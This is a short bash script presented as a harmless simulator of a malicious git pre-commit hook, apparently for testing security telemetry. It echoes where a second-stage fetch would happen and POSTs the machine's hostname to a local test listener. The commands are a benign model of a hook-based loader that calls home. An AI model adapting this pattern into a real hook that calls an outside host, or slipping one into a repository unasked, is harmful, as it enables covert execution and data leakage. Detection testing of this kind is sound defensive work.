#!/usr/bin/env bash
#
# git-hook-simulator.sh
#
# Benign stand in for a malicious git pre-commit hook. Logs what a
# real hook based loader would have done, then calls a local test
# listener so a network callback shows up in your telemetry. Touches
# nothing outside this script.
#
# To use as an actual hook for testing, copy into a scratch repo:
#   cp git-hook-simulator.sh /path/to/scratch-repo/.git/hooks/pre-commit
#   chmod +x /path/to/scratch-repo/.git/hooks/pre-commit
# Then run:
#   git -C /path/to/scratch-repo commit --allow-empty -m test
#
# Start a local listener first:
#   python3 local-test-listener.py

echo "[simulator] a malicious pre-commit hook would fetch a second stage here"

curl -s -X POST http://127.0.0.1:8787/callback \
  -H "Content-Type: application/json" \
  -d "{\"simulated\": true, \"host\": \"$(hostname)\"}" \
  || echo "[simulator] callback failed, start a listener first: python3 -m http.server 8787"

exit 0
